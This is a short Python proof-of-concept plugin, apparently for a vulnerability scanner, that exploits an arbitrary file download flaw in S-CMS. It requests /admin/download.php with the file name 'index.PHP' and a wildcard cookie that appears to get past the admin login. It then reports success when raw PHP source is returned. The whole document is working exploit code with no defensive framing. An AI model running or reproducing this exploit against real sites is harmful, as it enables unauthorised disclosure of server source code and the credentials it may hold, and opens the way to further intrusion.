#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

import re
from script import Script, SERVER_PORT_MAP

class POC(Script):
    def __init__(self, target=None):
        self.server_type = SERVER_PORT_MAP.WEB
        self.name = 's-cms download'
        self.keyword = ['s-cms', 'download']
        self.info = 's-cms download'
        self.type = 'download'
        self.level = 'high'
        self.refer = 'https://xz.aliyun.com/t/3614'
        Script.__init__(self, target=target, server_type=self.server_type)

    def prove(self):
        self.get_url()
        if self.base_url:
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/534.4 (KHTML, like Gecko) Chrome/6.0.481.0 Safari/534.4",
                "Cookie": "user=%;pass=%;"
                       }
            path_list = list(set([
                self.url_normpath(self.base_url, '/'),
                self.url_normpath(self.url, './'),
            ]))
            for path in path_list:
                poc = "index.php"
                url = path +"/admin/download.php?DownName=%s" % poc.replace("h","H")
                res = self.curl('get',url,headers = headers)
                if res != None and '<?php' in res.text:
                    self.flag = 1
                    self.req.append({"url": url})
                    self.res.append({"info": url, "key": "s-cms download", 'connect': res.text})
                    return